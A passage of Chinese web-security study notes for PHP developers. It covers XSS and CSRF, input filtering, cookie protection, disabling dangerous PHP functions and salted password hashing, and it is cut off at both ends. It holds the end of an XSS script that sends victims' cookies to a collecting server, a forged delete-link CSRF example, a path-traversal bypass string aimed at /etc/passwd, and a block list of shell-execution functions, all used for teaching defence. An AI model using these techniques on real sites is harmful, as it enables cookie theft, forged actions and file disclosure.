    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
此段代码携带着cookie信息传输给了 http://192.168.123.123/myxss/... 这段服务器，然后服务器的代码就可以接收到了用户的隐私消息，继而继续做其他的业务处理（myxss/index.php 中写一些可怕的代码，如把用户信息存进自己的数据库）。

有没感觉到背后一寒

看到这里感觉到危险了吧（想想初学程序时我们的站点完全没有这个意识，活生生的是在裸奔），=
既然此段脚本注入能携带着用户信息到收集服务器，那么再研究研究，他自然能发邮件？发帖？一系列业务逻辑？ ~~当然可以！。

这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。

那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：
一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 csdnblog.com/bbs/delete_article.php?id=“X" 那么，我只需要在论坛中发一帖，包含一链接：www.csdnblog.com/bbs/delete_article.php?id=“X" ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！

XSS与CSRF讲完了，回头我会讲下如何防范XSS与CSRF。

今天国庆日，6天后国足将在西安迎战叙利亚，此战胜负十分关键！祝好运！国足队员加油！

参考文章：
https://segmentfault.com/a/11... 《 总结 XSS 与 CSRF 两种跨站攻击 》
http://www.lxway.com/48228121... 《CSRF CORS》
```

### 输入过滤
```

过滤输入
过滤是Web应用安全的基础。它是你验证数据合法性的过程。通过在输入时确认对所有的数据进行过滤，你可以避免被污染（未过滤）数据在你的程序中被误信及误用。大多数流行的PHP应用的漏洞最终都是因为没有对输入进行恰当过滤造成的。


我所指的过滤输入是指三个不同的步骤：


l 识别输入

l 过滤输入

l 区分已过滤及被污染数据


把识别输入做为第一步是因为如果你不知道它是什么，你也就不能正确地过滤它。输入是指所有源自外部的数据。例如，所有发自客户端的是输入，但客户端并不是唯一的外部数据源，其它如数据库和RSS推送等也是外部数据源。

由用户输入的数据非常容易识别，PHP用两个超级公用数组$_GET 和$_POST来存放用户输入数据。其它的输入要难识别得多，例如，$_SERVER数组中的很多元素是由客户端所操纵的。常常很难确认$_SERVER数组中的哪些元素组成了输入，所以，最好的方法是把整个数组看成输入。

在某些情况下，你把什么作为输入取决于你的观点。例如，session数据被保存在服务器上，你可能不会认为session数据是一个外部数据源。如果你持这种观点的话，可以把session数据的保存位置是在你的软件的内部。意识到session的保存位置的安全与软件的安全是联系在一起的事实是非常明智的。同样的观点可以推及到数据库，你也可以把它看成你软件的一部分。

一般来说，把session保存位置与数据库看成是输入是更为安全的，同时这也是我在所有重要的PHP应用开发中所推荐的方法。

一旦识别了输入，你就可以过滤它了。过滤是一个有点正式的术语，它在平时表述中有很多同义词，如验证、清洁及净化。尽管这些大家平时所用的术语稍有不同，但它们都是指的同一个处理：防止非法数据进入你的应用。

有很多种方法过滤数据，其中有一些安全性较高。最好的方法是把过滤看成是一个检查的过程。请不要试图好心地去纠正非法数据，要让你的用户按你的规则去做，历史证明了试图纠正非法数据往往会导致安全漏洞。例如，考虑一下下面的试图防止目录跨越的方法（访问上层目录）。


CODE:


1

2

3

4

5

6


  

  $filename = str_replace('..', '.',

$_POST['filename']);

  

  ?>




你能想到$_POST['filename']如何取值以使$filename成为Linux系统中用户口令文件的路径../../etc/passwd吗？


答案很简单：

1

.../.../etc/passwd



这个特定的错误可以通过反复替换直至找不到为止：


CODE:


1

2

3

4

5

6

7

8

9

  
  $filename = $_POST['filename'];

  while (strpos($_POST['filename'], '..') !=  =

FALSE)

  {

    $filename = str_replace('..', '.',

$filename);

  }

  ?>




当然，函数basename( )可以替代上面的所有逻辑，同时也能更安全地达到目的。不过重要点是在于任何试图纠正非法数据的举动都可能导致潜在错误并允许非法数据通过。只做检查是一个更安全的选择。


译注：这一点深有体会，在实际项目曾经遇到过这样一件事，是对一个用户注册和登录系统进行更改，客户希望用户名前后有空格就不能登录，结果修改时对用户登录程序进行了更改，用trim（）函数把输入的用户名前后的空格去掉了（典型的好心办坏事），但是在注册时居然还是允许前后有空格！结果可想而知。

除了把过滤做为一个检查过程之外，你还可以在可能时用白名单方法。它是指你需要假定你正在检查的数据是非法的，除非你能证明它是合法的。换而言之，你宁可在小心上犯错。使用这个方法，一个错误只会导致你把合法的数据当成是非法的。尽管不想犯任何错误，但这样总比把非法数据当成合法数据要安全得多。通过减轻犯错引起的损失，你可以提高你的应用的安全性。尽管这个想法在理论上是很自然的，但历史证明，这是一个很有价值的方法。

如果你能正确可靠地识别和过滤输入，你的工作就基本完成了。最后一步是使用一个命名约定或其它可以帮助你正确和可靠地区分已过滤和被污染数据的方法。我推荐一个比较简单的命名约定，因为它可以同时用在面向过程和面向对象的编程中。我用的命名约定是把所有经过滤的数据放入一个叫$clean的数据中。你需要用两个重要的步骤来防止被污染数据的注入：


l 经常初始化$clean为一个空数组。

l 加入检查及阻止来自外部数据源的变量命名为clean，


实际上，只有初始化是至关紧要的，但是养成这样一个习惯也是很好的：把所有命名为clean的变量认为是你的已过滤数据数组。这一步骤合理地保证了$clean中只包括你有意保存进去的数据，你所要负责的只是不在$clean存在被污染数据。


为了巩固这些概念，考虑下面的表单，它允许用户选择三种颜色中的一种；

CODE:


1

2

3

4

5

6

7

8

9

10

11



  Please select a color:

  

  

  





在处理这个表单的编程逻辑中，非常容易犯的错误是认为只能提交三个选择中的一个。在第二章中你将学到，客户端能提交任何数据作为$_POST['color']的值。为了正确地过滤数据，你需要用一个switch语句来进行：

CODE:


1

2

3

4

5

6

7

8

9

10

11

12

13


 

$clean = array(  );

switch($_POST['color'])

{

  case 'red':

  case 'green':

  case 'blue':

    $clean['color'] = $_POST['color'];

    break;

}

 

?>



本例中首先初始化了$clean为空数组以防止包含被污染的数据。一旦证明$_POST['color']是red, green, 或blue中的一个时，就会保存到$clean['color']变量中。因此，可以确信$clean['color']变量是合法的，从而在代码的其它部分使用它。当然，你还可以在switch结构中加入一个default分支以处理非法数据的情况。一种可能是再次显示表单并提示错误。特别小心不要试图为了友好而输出被污染的数据。

上面的方法对于过滤有一组已知的合法值的数据很有效，但是对于过滤有一组已知合法字符组成的数据时就没有什么帮助。例如，你可能需要一个用户名只能由字母及数字组成：


CODE:


1

2

3

4

5

6

7

8

9

10


 

 $clean = array(  );

 

 if (ctype_alnum($_POST['username']))

 {

   $clean['username'] = $_POST['username'];

 }

 

 ?>



尽管在这种情况下可以用正则表达式，但使用PHP内置函数是更完美的。这些函数包含错误的可能性要比你自已写的代码出错的可能性要低得多，而且在过滤逻辑中的一个错误几乎就意味着一个安全漏洞。
https://www.php.cn/php-weizijiaocheng-353044.html
```

### Cookie 安全
```
https://www.jb51.net/article/84106.htm
本文实例讲述了php用户登录之cookie信息安全。分享给大家供大家参考，具体如下：

大家都知道用户登陆后，用户信息一般会选择保存在cookie里面，因为cookie是保存客户端，并且cookie可以在客户端用浏览器自由更改，这样将会造成用户cookie存在伪造的危险，从而可能使伪造cookie者登录任意用户的账户。

下面就说说平常一些防止用户登录cookie信息安全的方法：

一、cookie信息加密法

cookie信息加密法即用一种加密方法，加密用户信息，然后在存入cookie，这样伪造者即使得到cookie也只能在cookie有效期内对这个cookie利用，无法另外伪造cookie信息。

这里附上一个加密函数：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
<?php
function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
  // 动态密匙长度，相同的明文会生成不同密文就是依靠动态密匙
  $ckey_length = 4;
  // 密匙
  $key = md5($key ? $key : $GLOBALS['discuz_auth_key']);
  // 密匙a会参与加解密
  $keya = md5(substr($key, 0, 16));
  // 密匙b会用来做数据完整性验证
  $keyb = md5(substr($key, 16, 16));
  // 密匙c用于变化生成的密文
  $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length):
substr(md5(microtime()), -$ckey_length)) : '';
  // 参与运算的密匙
  $cryptkey = $keya.md5($keya.$keyc);
  $key_length = strlen($cryptkey);
  // 明文，前10位用来保存时间戳，解密时验证数据有效性，10到26位用来保存$keyb(密匙b)，
//解密时会通过这个密匙验证数据完整性
  // 如果是解码的话，会从第$ckey_length位开始，因为密文前$ckey_length位保存 动态密匙，以保证解密正确
  $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) :
sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
  $string_length = strlen($string);
  $result = '';
  $box = range(0, 255);
  $rndkey = array();
  // 产生密匙簿
  for($i = 0; $i <= 255; $i++) {
    $rndkey[$i] = ord($cryptkey[$i % $key_length]);
  }
  // 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上对并不会增加密文的强度
  for($j = $i = 0; $i < 256; $i++) {
    $j = ($j + $box[$i] + $rndkey[$i]) % 256;
    $tmp = $box[$i];
    $box[$i] = $box[$j];
    $box[$j] = $tmp;
  }
  // 核心加解密部分
  for($a = $j = $i = 0; $i < $string_length; $i++) {
    $a = ($a + 1) % 256;
    $j = ($j + $box[$a]) % 256;
    $tmp = $box[$a];
    $box[$a] = $box[$j];
    $box[$j] = $tmp;
    // 从密匙簿得出密匙进行异或，再转成字符
    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
  }
  if($operation == 'DECODE') {
    // 验证数据有效性，请看未加密明文的格式
    if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() --> 0) &&
substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
      return substr($result, 26);
    } else {
      return '';
    }
  } else {
    // 把动态密匙保存在密文里，这也是为什么同样的明文，生产不同密文后能解密的原因
    // 因为加密后的密文可能是一些特殊字符，复制过程可能会丢失，所以用base64编码
    return $keyc.str_replace('=', '', base64_encode($result));
  }
}
$str = 'abcdef';
$key = 'www.jb51.net';
echo $jm = authcode($str,'ENCODE',$key,0); //加密
echo "
";
echo authcode($jm ,'DECODE',$key,0); //解密
?>
这样当设置用户信息的cookie时，就无法对其进行伪造：

1
2
3
4
5
6
<?php
$user = array("uid"=-->$uid,"username"=>$username);
$user = base64_encode(serialize($user));
$user = authcode($user,'ENCODE','www.jb51.net',0); //加密
setcookie("user",$user,time()+3600*24);
?>
二、用加密令牌对cookie进行保护

1
2
3
4
5
$hash = md5($uid.time());//加密令牌值
$hash_expire =time()+3600*24;//加密令牌值为一天有效期
$user = array("uid"=>$uid,"username"=>$username,"hash"=>$hash);
$user = base64_encode(serialize($user));
setcookie("user",$user,$hash_expr);
然后把$hash和$hash_expire 存入member表中hash和hash_expire对应字段中,也可以存入nosql，session

用户伪造cookie时，hash无法伪造,伪造的hash和数据库中的不一致

用户每次登陆，这个hash_expire有效期内不更新hash值，过期则更新
```

### 禁用 `mysql_` 系函数
```
https://www.jb51.net/article/89240.htm
php禁用函数设置及查看方法详解
 更新时间：2016年07月25日 16:04:59   转载 作者：宰相秋水  
这篇文章主要介绍了php禁用函数设置及查看方法,结合实例形式分析了php禁用函数的方法及使用php探针查看禁用函数信息的相关实现技巧,需要的朋友可以参考下

 
本文实例讲述了php禁用函数设置及查看方法。分享给大家供大家参考，具体如下：

打开PHP.INI，找到这行：

disable_functions =

在后面那里加上要禁用的函数，如禁用多个函数，要用半角逗号 , 分开

给个例子：
复制代码代码如下:
disable_functions = passthru,exec,system,popen,chroot,scandir,chgrp,chown,escapesh
ellcmd,escapeshellarg,shell_exec,proc_open,proc_get_status
建议在主机上禁用的函数：
复制代码代码如下:
disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close, proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid, posix_getppid,posix_getpwnam,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname

在主机上面如何查看禁用的函数列表，我从网上找了一个非常不错的探针
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
<?php
header("content-Type: text/html; charset=utf-8");
header("Cache-Control: no-cache, must-revalidate");
header("Pragma: no-cache");
error_reporting(0);
ob_end_flush();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Pragma" content="No-cache" />
<meta http-equiv="Expires" content="0" />
<meta http-equiv="cache-control" content="private" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />//加了这句，看看能不能解决linux下显示乱码的问题？
<title>PHP 探针 v1.0</title>
<style type="text/css">
<!--
body{text-align:center;margin-top:20px;background-color:#a9b674;}
#overview{width:700px;margin:0 auto;text-align:left;}
a{text-decoration:underline;color:#992700;}
.strong{color:#992700;}
.basew{width:300px;}
-->
</style>
</head>
<body>
<div id="overview">
<div id="copyright">版权信息
<a href="hello.php?typ=baseinfo">[基本信息]</a> <a href="hello.php?typ=superinfo">[高级信息]</a>
<?php
if (function_exists("phpinfo")){
  echo'<a href="hello.php?typ=phpinfo">[phpinfo]</a>';}
echo'<br />php探针v1.0 by MKDuse(blueidea-id)<br /><br />此程序代码，可免费使用；但不得用于商业用途；完全转载或使用此代码，请保留版权信息；<br />欢迎指正错误提建议，QQ：122712355</div>';
if (empty($_GET['typ'])){
  baseinfo();}
else{
switch ($_GET['typ']){
case 'phpinfo':
phpinfoview();
break;
case 'superinfo':
superinfo();
break;
case 'baseinfo':
baseinfo();
break;
default:
baseinfo();}
}
function getime()
{
 $t = gettimeofday();
 return (float)($t['sec'] + $t['usec']/1000000);
}
function baseinfo(){
echo '<h1>基本信息</h1>';
$arr[]=array("Current PHP version:",phpversion());
$arr[]=array("Zend engine version:",zend_version());
$arr[]=array("服务器版本",$_SERVER['SERVER_SOFTWARE']);
$arr[]=array("ip地址",$_SERVER['REMOTE_HOST']);//ip
$arr[]=array("域名",$_SERVER['HTTP_HOST']);
$arr[]=array("协议端口",$_SERVER['SERVER_PROTOCOL'].' '.$_SERVER['SERVER_PORT']);
$arr[]=array("站点根目录",$_SERVER['PATH_TRANSLATED']);
$arr[]=array("服务器时间",date('Y年m月d日,H:i:s,D'));
$arr[]=array("当前用户",get_current_user());
$arr[]=array("操作系统",php_uname('s').php_uname('r').php_uname('v'));
$arr[]=array("include_path",ini_get('include_path'));
$arr[]=array("Server API",php_sapi_name());
$arr[]=array("error_reporting level",ini_get("display_errors"));
$arr[]=array("POST提交限制",ini_get('post_max_size'));
$arr[]=array("upload_max_filesize",ini_get('upload_max_filesize'));
$arr[]=array("脚本超时时间",ini_get('max_execution_time').'秒');
if (ini_get("safe_mode")==0){
$arr[]=array("PHP安全模式(Safe_mode)",'off');}
else{
$arr[]=array("PHP安全模式(Safe_mode)",'on');}
if (function_exists('memory_get_usage')){
$arr[]=array("memory_get_usage",ini_get('memory_get_usage'));}
//$arr[]=array("可用空间",intval(diskfreespace('/')/(1024 * 1024))."M");
echo'<table>';
for($i=0;$i<count($arr);$i++)
{
  $overview='<tr><td class="basew">'.$arr[$i][0].'</td><td>'.$arr[$i][1].'</td></tr>';
  echo $overview;
}
echo'</table>';
echo '<h2>服务器性能测试</h2>';
echo'<table><tr><td>服务器</td><td>整数运算<br />50万次加法(1+1)</td><td>浮点运算<br />50万次平方根(3.14开方)</td></tr>';
echo'<tr><td>MKDuse的机子(P4 1.5G 256DDR winxp sp2)</td><td>465.08ms</td><td>466.66ms</td></tr>';
$time_start=getime();
for($i=0;$i<=500000;$i++);
{$count=1+1;}
$timea=round((getime()-$time_start)*1000,2);
echo '<tr class="strong"><td>当前服务器</td><td>'.$timea.'ms</td>';
$time_start=getime();
for($i=0;$i<=500000;$i++);
{sqrt(3.14);}
$timea=round((getime()-$time_start)*1000,2);
echo '<td>'.$timea.'ms</td></tr></table>';
?>
<script language="javascript" type="text/javascript">
function gettime()
{
 var time;
 time=new Date();
 return time.getTime();
}
start_time=gettime();
</script>
<?php
echo '<h2>带宽测试</h2>';
for ($i=0;$i<100;$i++){
print "<!--1234567890#########0#########0#########0#########0#########0#########0#########0#########012345-->";}
?>
<p id="dk"></p>
<script language="javascript" type='text/javascript'>
var timea;
var netspeed;
timea=gettime()-start_time;
netspeed=Math.round(10/timea*1000);
document.getElementByIdx("dk").innerHTML="向客户端发送10KB数据，耗时"+timea+"ms<br />您与此服务器的连接速度为"+netspeed+"kb/s";
</script>
<?php
echo'<h2>已加载的扩展库(enable)</h2><div>';
$arr =get_loaded_extensions();
foreach($arr as $value){
  echo $value.'<br />';}
echo'</div><h2>禁用的函数</h2><p>';
$disfun=ini_get('disable_functions');
if (empty($disfun)){
  echo'没有禁用</p>';}
else{
echo ini_get('disable_functions').'</p>';}
}//关闭
function superinfo(){
echo'<h1>高级信息</h1><p>PHP_INI_USER 1 配置选项可用在用户的 PHP 脚本或Windows 注册表中<br> PHP_INI_PERDIR 2 配置选项可在 php.ini, .htaccess 或 httpd.conf 中设置 <br>PHP_INI_SYSTEM 4 配置选项可在 php.ini or httpd.conf 中设置 <br>PHP_INI_ALL 7 配置选项可在各处设置</p>';
$arr1=ini_get_all();
for ($i=0;$i<count($arr1);$i++)
  {
$arr2=array_slice($arr1,$i,1);
print_r($arr2);
echo '<br />';
}
}
function phpinfoview(){
  phpinfo();
}
?>
</div>
</body>
</html>
更多关于PHP相关内容感兴趣的读者可查看本站专
```

### 数据库存储用户密码时，应该是怎么做才安全
```
https://www.cnblogs.com/milantgh/p/3612318.html
如何安全的存储用户的密码
大多数的web开发者都会遇到设计用户账号系统的需求。账号系统最重要的一个方面就是如何保护用户的密码。一些大公司的用户数据库泄露事件也时有发生，所以我们必须采取一些措施来保护用户的密码，即使网站被攻破的情况下也不会造成较大的危害。如果你还在存储用户密码的MD5,那可真的有点弱了。赶紧来看看这篇文章吧。

保护密码最好的的方式就是使用带盐的密码hash(salted password hashing).对密码进行hash操作是一件很简单的事情，但是很多人都犯了错。接下来我希望可以详细的阐述如何恰当的对密码进行hash，以及为什么要这样做。

重要提醒
如果你打算自己写一段代码来进行密码hash，那么赶紧停下吧。这样太容易犯错了。这个提醒适用于每一个人，不要自己写密码的hash算法 ！关于保存密码的问题已经有了成熟的方案，那就是使用phpass或者本文提供的源码。

什么是hash

hash("hello") = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
hash("hbllo") = 58756879c05c68dfac9866712fad6a93f8146f337a69afe7dd238f3364946366
hash("waltz") = c0e81794384491161f1777c232bc6bd9ec38f616560b120fda8e90f383853542
Hash算法是一种单向的函数。它可以把任意数量的数据转换成固定长度的“指纹”，这个过程是不可逆的。而且只要输入发生改变，哪怕只有一个bit，输出的hash值也会有很大不同。这种特性恰好合适用来用来保存密码。因为我们希望使用一种不可逆的算法来加密保存的密码，同时又需要在用户登陆的时候验证密码是否正确。

在一个使用hash的账号系统中，用户注册和认证的大致流程如下：

1, 用户创建自己的账号 
2, 用户密码经过hash操作之后存储在数据库中。没有任何明文的密码存储在服务器的硬盘上。 
3, 用户登陆的时候，将用户输入的密码进行hash操作后与数据库里保存的密码hash值进行对比。 
4, 如果hash值完全一样，则认为用户输入的密码是正确的。否则就认为用户输入了无效的密码。 
5, 每次用户尝试登陆的时候就重复步骤3和步骤4。
在步骤4的时候不要告诉用户是账号还是密码错了。只需要显示一个通用的提示，比如账号或密码不正确就可以了。这样可以防止攻击者枚举有效的用户名。

还需要注意的是用来保护密码的hash函数跟数据结构课上见过的hash函数不完全一样。比如实现hash表的hash函数设计的目的是快速，但是不够安全。只有加密hash函数(cryptographic hash functions)可以用来进行密码的hash。这样的函数有SHA256, SHA512, RipeMD, WHIRLPOOL等。

一个常见的观念就是密码经过hash之后存储就安全了。这显然是不正确的。有很多方式可以快速的从hash恢复明文的密码。还记得那些md5破解网站吧，只需要提交一个hash，不到一秒钟就能知道结果。显然，单纯的对密码进行hash还是远远达不到我们的安全需求。下一部分先讨论一下破解密码hash，获取明文常见的手段。

如何破解hash
字典和暴力破解攻击(Dictionary and Brute Force Attacks)
最常见的破解hash手段就是猜测密码。然后对每一个可能的密码进行hash，对比需要破解的hash和猜测的密码hash值，如果两个值一样，那么之前猜测的密码就是正确的密码明文。猜测密码攻击常用的方式就是字典攻击和暴力攻击。

Dictionary Attack

Trying apple        : failed
Trying blueberry    : failed
Trying justinbeiber : failed
...
Trying letmein      : failed
Trying s3cr3t       : success!
字典攻击是将常用的密码，单词，短语和其他可能用来做密码的字符串放到一个文件中，然后对文件中的每一个词进行hash，将这些hash与需要破解的密码hash比较。这种方式的成功率取决于密码字典的大小以及字典的是否合适。

Brute Force Attack

Trying aaaa : failed
Trying aaab : failed
Trying aaac : failed
...
Trying acdb : failed
Trying acdc : success!
暴力攻击就是对于给定的密码长度，尝试每一种可能的字符组合。这种方式需要花费大量的计算机时间。但是理论上只要时间足够，最后密码一定能够破解出来。只是如果密码太长，破解花费的时间就会大到无法承受。

目前没有方式可以阻止字典攻击和暴力攻击。只能想办法让它们变的低效。如果你的密码hash系统设计的是安全的，那么破解hash唯一的方式就是进行字典或者暴力攻击了。

查表破解(Lookup Tables)
对于特定的hash类型，如果需要破解大量hash的话，查表是一种非常有效而且快速的方式。它的理念就是预先计算(pre-compute)出密码字典中每一个密码的hash。然后把hash和对应的密码保存在一个表里。一个设计良好的查询表结构，即使存储了数十亿个hash，每秒钟仍然可以查询成百上千个hash。

如果你想感受下查表破解hash的话可以尝试一下在CraskStation上破解下下面的sha256 hash。

c11083b4b0a7743af748c85d343dfee9fbb8b2576c05f3a7f0d632b0926aadfc
08eac03b80adc33dc7d8fbe44b7c7b05d3a2c511166bdb43fcb710b03ba919e7
e4ba5cbd251c98e6cd1c23f126a3b81d8d8328abc95387229850952b3ef9f904
5206b8b8a996cf5320cb12ca91c7b790fba9f030408efe83ebb83548dc3007bd
反向查表破解(Reverse Lookup Tables)
Searching for hash(apple) in users' hash list...     : Matches [alice3, 0bob0, charles8]
Searching for hash(blueberry) in users' hash list... : Matches [usr10101, timmy, john91]
Searching for hash(letmein) in users' hash list...   : Matches [wilson10, dragonslayerX, joe1984]
Searching for hash(s3cr3t) in users' hash list...    : Matches [bruce19, knuth1337, john87]
Searching for hash(z@29hjja) in users' hash list...  : No users used this password
这种方式可以让攻击者不预先计算一个查询表的情况下同时对大量hash进行字典和暴力破解攻击。

首先，攻击者会根据获取到的数据库数据制作一个用户名和对应的hash表。然后将常见的字典密码进行hash之后，跟这个表的hash进行对比，就可以知道用哪些用户使用了这个密码。这种攻击方式很有效果，因为通常情况下很多用户都会有使用相同的密码。

彩虹表 (Rainbow Tables)
彩虹表是一种使用空间换取时间的技术。跟查表破解很相似。只是它牺牲了一些破解时间来达到更小的存储空间的目的。因为彩虹表使用的存储空间更小，所以单位空间就可以存储更多的hash。彩虹表已经能够破解8位长度的任意md5hash。彩虹表具体的原理可以参考http://www.project-rainbowcrack.com/

下一章节我们会讨论一种叫做“盐”(salting)的技术。通过这种技术可以让查表和彩虹表的方式无法破解hash。

加盐(Adding Salt)
hash("hello")                    = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
hash("hello" + "QxLUF1bgIAdeQX") = 9e209040c863f84a31e719795b2577523954739fe5ed3b58a75cff2127075ed1
hash("hello" + "bv5PehSMfV11Cd") = d1d3ec2e6f20fd420d50e2642992841d8338a314b8ea157c9e18477aaef226ab
hash("hello" + "YYLmfY6IehjZMQ") = a49670c3c18b9e079b9cfaf51634f563dc8ae3070db2c4a8544305df1b60f007
查表和彩虹表的方式之所以有效是因为每一个密码的都是通过同样的方式来进行hash的。如果两个用户使用了同样的密码，那么一定他们的密码hash也一定相同。我们可以通过让每一个hash随机化，同一个密码hash两次，得到的不同的hash来避免这种攻击。

具体的操作就是给密码加一个随即的前缀或者后缀，然后再进行hash。这个随即的后缀或者前缀成为“盐”。正如上面给出的例子一样，通过加盐，相同的密码每次hash都是完全不一样的字符串了。检查用户输入的密码是否正确的时候，我们也还需要这个盐，所以盐一般都是跟hash一起保存在数据库里，或者作为hash字符串的一部分。

盐不需要保密，只要盐是随机的话，查表，彩虹表都会失效。因为攻击者无法事先知道盐是什么，也就没有办法预先计算出查询表和彩虹表。如果每个用户都是使用了不同的盐，那么反向查表攻击也没法成功。

下一节，我们会介绍一些盐的常见的错误实现。

错误的方式：短的盐和盐的复用
最常见的错误实现就是一个盐在多个hash中使用或者使用的盐很短。

盐的复用(Salt Reuse)
不管是将盐硬编码在程序里还是随机一次生成的，在每一个密码hash里使用相同的盐会使这种防御方法失效。因为相同的密码hash两次得到的结果还是相同的。攻击者就可以使用反向查表的方式进行字典和暴力攻击。只要在对字典中每一个密码进行hash之前加上这个固定的盐就可以了。如果是流行的程序的使用了硬编码的盐，那么也可能出现针对这种程序的这个盐的查询表和彩虹表，从而实现快速破解hash。

用户每次创建或者修改密码一定要使用一个新的随机的盐

短的盐
如果盐的位数太短的话，攻击者也可以预先制作针对所有可能的盐的查询表。比如，3位ASCII字符的盐，一共有95x95x95 = 857,375种可能性。看起来好像很多。假如每一个盐制作一个1MB的包含常见密码的查询表，857,375个盐才是837GB。现在买个1TB的硬盘都只要几百块而已。

基于同样的理由，千万不要用用户名做为盐。虽然对于每一个用户来说用户名可能是不同的，但是用户名是可预测的，并不是完全随机的。攻击者完全可以用常见的用户名作为盐来制作查询表和彩虹表破解hash。

根据一些经验得出来的规则就是盐的大小要跟hash函数的输出一致。比如，SHA256的输出是256bits(32bytes),盐的长度也应该是32个字节的随机数据。

错误的方式：双重hash和古怪的hash函数
这一节讨论另外一个常见的hash密码的误解:古怪的hash算法组合。人们可能解决的将不同的hash函数组合在一起用可以让数据更安全。但实际上，这种方式带来的效果很微小。反而可能带来一些互通性的问题，甚至有时候会让hash更加的不安全。本文一开始就提到过，永远不要尝试自己写hash算法，要使用专家们设计的标准算法。有些人会觉得通过使用多个hash函数可以降低计算hash的速度，从而增加破解的难度。通过减慢hash计算速度来防御攻击有更好的方法，这个下文会详细介绍。

下面是一些网上找到的古怪的hash函数组合的样例。

md5(sha1(password))
md5(md5(salt) + md5(password))
sha1(sha1(password))
sha1(str_rot13(password + salt))
md5(sha1(md5(md5(password) + sha1(password)) + md5(password)))
不要使用他们！

注意：这部分的内容其实是存在争议的！我收到过大量邮件说组合hash函数是有意义的。因为如果攻击者不知道我们用了哪个函数，就不可能事先计算出彩虹表，并且组合hash函数需要更多的计算时间。

攻击者如果不知道hash算法的话自然是无法破解hash的。但是考虑到Kerckhoffs’s principle,攻击者通常都是能够接触到源码的(尤其是免费软件和开源软件)。通过一些目标系统的密码–hash对应关系来逆向出算法也不是非常困难。

如果你想使用一个标准的”古怪”的hash函数，比如HMAC，是可以的。但是如果你的目的是想减慢hash的计算速度，那么可以读一下后面讨论的慢速hash函数部分。基于上面讨论的因素，最好的做法是使用标准的经过严格测试的hash算法。

hash碰撞(Hash Collisions)
因为hash函数是将任意数量的数据映射成一个固定长度的字符串，所以一定存在不同的输入经过hash之后变成相同的字符串的情况。加密hash函数(Cryptographic hash function)在设计的时候希望使这种碰撞攻击实现起来成本难以置信的高。但时不时的就有密码学家发现快速实现hash碰撞的方法。最近的一个例子就是MD5，它的碰撞攻击已经实现了。

碰撞攻击是找到另外一个跟原密码不一样，但是具有相同hash的字符串。但是，即使在相对弱的hash算法，比如MD5,要实现碰撞攻击也需要大量的算力(computing power),所以在实际使用中偶然出现hash碰撞的情况几乎不太可能。一个使用加盐MD5的密码hash在实际使用中跟使用其他算法比如SHA256一样安全。不过如果可以的话，使用更安全的hash函数，比如SHA256, SHA512, RipeMD, WHIRLPOOL等是更好的选择。

正确的方式：如何恰当的进行hash
这部分会详细讨论如何恰当的进行密码hash。第一个章节是最基础的，这章节的内容是必须的。后面一个章节是阐述如何继续增强安全性，让hash破解变得异常困难。

基础：使用加盐hash
